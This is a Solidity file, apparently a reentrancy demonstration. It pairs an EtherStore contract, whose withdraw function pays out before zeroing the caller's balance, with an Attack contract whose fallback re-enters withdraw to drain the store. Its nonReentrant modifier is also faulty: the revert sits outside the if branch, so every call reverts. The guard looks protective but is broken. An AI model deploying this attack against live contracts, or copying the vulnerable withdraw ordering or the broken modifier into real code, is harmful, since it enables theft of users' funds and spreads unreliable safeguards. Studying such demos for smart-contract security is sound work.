// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract EtherStore {
    error EtherStore__ReEntrant();

    mapping(address => uint256) public balances;
    uint256 internal locked;

    modifier nonReentrant() {
        if (locked == 0) {
            locked = 1;
            _;
            locked = 0;
        }
        revert EtherStore__ReEntrant();
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // receive() external payable{
    //     console.log("receive called");
    //     if (address(etherStore).balance >= 1 ether) {
    //         etherStore.withdraw();
    //     }
    // }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
